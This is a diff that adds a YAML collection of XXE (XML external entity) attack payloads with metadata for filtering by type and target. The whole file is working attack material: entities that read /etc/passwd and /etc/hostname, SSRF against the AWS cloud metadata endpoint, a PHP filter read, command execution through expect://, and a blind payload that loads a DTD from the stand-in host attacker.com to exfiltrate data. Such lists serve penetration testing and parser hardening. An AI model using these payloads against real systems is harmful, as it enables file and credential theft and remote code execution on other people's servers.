@@ -1,0 +1,74 @@
+# XXE Payloads with Metadata
+# Usage: Filter by type and target
+
+payloads:
+  # Classic XXE - file read
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <root>&xxe;</root>
+    type: file-read
+    target_file: /etc/passwd
+    technique: internal-entity
+    os: linux
+
+  # XXE - SSRF to cloud metadata
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+      <root>&xxe;</root>
+    type: ssrf
+    target: aws-metadata
+    technique: internal-entity
+    severity: critical
+
+  # XXE - hostname disclosure
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ELEMENT foo ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/hostname">
+      ]>
+      <foo>&xxe;</foo>
+    type: file-read
+    target_file: /etc/hostname
+    technique: internal-entity
+    os: linux
+
+  # Blind XXE - out-of-band exfiltration
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
+        %remote;
+      ]>
+      <foo>&send;</foo>
+    type: blind-oob
+    technique: parameter-entity
+    note: "Requires attacker-controlled DTD server"
+
+  # XXE with PHP filters
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+      ]>
+      <foo>&xxe;</foo>
+    type: file-read
+    target_file: /etc/passwd
+    technique: php-filter
+    os: linux
+    note: "PHP-specific, base64-encodes output to avoid XML parsing issues"
+
+  # XXE with expect (RCE)
+  - payload: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "expect://id">
+      ]>
+      <foo>&xxe;</foo>
+    type: rce
+    technique: expect-wrapper
+    os: linux
+    note: "Requires PHP expect module - rare but critical"
+    severity: critical
